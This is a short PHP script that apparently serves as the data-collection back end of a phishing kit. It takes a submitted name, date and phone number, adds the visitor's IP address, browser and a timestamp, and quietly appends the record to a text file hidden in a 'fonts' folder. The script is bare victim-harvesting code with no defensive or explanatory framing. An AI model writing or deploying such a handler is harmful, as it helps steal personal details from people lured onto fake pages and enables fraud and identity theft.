<?php
date_default_timezone_set('GMT');
$TIME    = date("d-m-Y H:i:s");
$browser = getenv ("HTTP_USER_AGENT");
function getUserIP() {

    $ipaddress = '';

    if (isset($_SERVER['HTTP_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_X_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];

    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_FORWARDED'];

    else if(isset($_SERVER['REMOTE_ADDR']))

        $ipaddress = $_SERVER['REMOTE_ADDR'];

    else

        $ipaddress = 'UNKNOWN';

    return $ipaddress;

}	

$ip= getUserIP();
$nom = $_POST['nom'];
$date = $_POST['date'];
$phone = $_POST['phone'];
$mok = "--------------------+ INFO +--------------------\n";
$mok .= "NOM              : $nom \n";
$mok .= "Date              : $date \n";
$mok .= "PHONE              : $phone \n";
$mok .= "IP : ".$ip."\n";
$mok .= "Navigateur : ".$browser."\n";
$mok .= "Time              : $TIME \n";
$mok .= "--------------------+ INFO +--------------------\n";
$myFile ="fonts/monami.txt";
$file = fopen($myFile, 'a+') or die ("can't open file");
fwrite($file, "\n".$mok);
fclose($file);

?>